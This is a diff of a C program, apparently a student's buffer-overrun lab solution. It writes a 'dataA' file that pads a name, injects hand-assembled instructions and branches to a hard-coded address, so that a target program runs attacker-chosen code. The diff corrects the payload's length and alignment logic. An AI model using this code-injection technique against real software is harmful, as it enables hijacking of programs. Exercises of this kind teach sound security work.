@@ -5,7 +5,6 @@
 int main(void) {
     char pcInject[48];
     char pcName[] = "Angeline Yan and Jade Sceats";
-    int i = 0;
     int iNameLength;
     unsigned long uiTargetAddr = 0x400890;
     unsigned int uiAdr, uiMov, uiStrb, uiB;
@@ -14,12 +13,12 @@ int main(void) {
     /* get name(s) to use in dataA */
     /* max name length is 48 - 1 (for nullbyte) - 4 * 4 (for the 4
     instructions) */
-    iNameLength = strlen(pcName);
+    iNameLength = strlen(pcName) + 1;
     strcpy(pcInject, pcName);
     
     /* ensure instructions are 4-byte aligned */
-    while (i % 4 != 0) {
-       pcInject[i++] = '\0';
+    while ((iNameLength) % 4 != 0) {
+       pcInject[iNameLength++] = '\0';
     }
 
     psFile = fopen("dataA", "w");
@@ -36,15 +35,15 @@ int main(void) {
     /* set "A" instr */
     uiStrb = MiniAssembler_strb(1, 0);
     fwrite(&uiStrb, sizeof(unsigned int), 1, psFile);
-    i = i + 12;
+    iNameLength = iNameLength + 12;
     /* branch to print instr (0x40089c is addr of print instr in main,
     0x420058 + i is addr of this instr) */
-    uiB = MiniAssembler_b(0x40089c, 0x420058 + i);
+    uiB = MiniAssembler_b(0x40089c, 0x420058 + iNameLength);
     fwrite(&uiB, sizeof(unsigned int), 1, psFile);
-    i = i + 4;
+    iNameLength = iNameLength + 4;
 
     /* pad as necessary */
-    for (; i < 48; i++) {
+    for (; iNameLength < 48; iNameLength++) {
         fprintf(psFile, "%c", 0x30);
     }
 
